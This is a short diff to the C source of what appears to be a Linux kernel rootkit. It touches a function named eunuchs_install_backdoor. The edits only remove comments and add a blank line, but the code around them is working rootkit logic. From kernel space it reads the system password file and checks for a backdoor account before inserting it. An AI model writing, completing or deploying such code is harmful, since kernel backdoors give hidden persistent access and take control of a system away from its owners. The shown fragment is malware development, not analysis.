@@ -898,7 +898,6 @@ static int eunuchs_install_backdoor(void)
         goto fail;
     }
 
-    /* do stuff with passwd */
     buf = kmalloc(sizeof(char) * (size + 1), GFP_KERNEL);
     if(!buf)
     {
@@ -907,12 +906,12 @@ static int eunuchs_install_backdoor(void)
         goto fail;
     }
 
-    /* if(IS_ERR(res = kernel_read(f_passwd, passwd_buf, size + 1, pos))) */
     if(IS_ERR(res = vfs_read(f, buf, size, &pos)))
     {
         debug("vfs_read failed on passwd: %ld\n", PTR_ERR(res));
         goto fail;
     }
+
     /* does the file already contain the backdoor account? don't add it again */
     if(!strnstr(buf, EUNUCHS_PASSWD_MOD, size))
     {
@@ -945,7 +944,6 @@ static int eunuchs_install_backdoor(void)
         goto fail;
     }
 
-    /* do stuff with passwd */
     buf = kmalloc(sizeof(char) * (size + 1), GFP_KERNEL);
     if(!buf)
     {
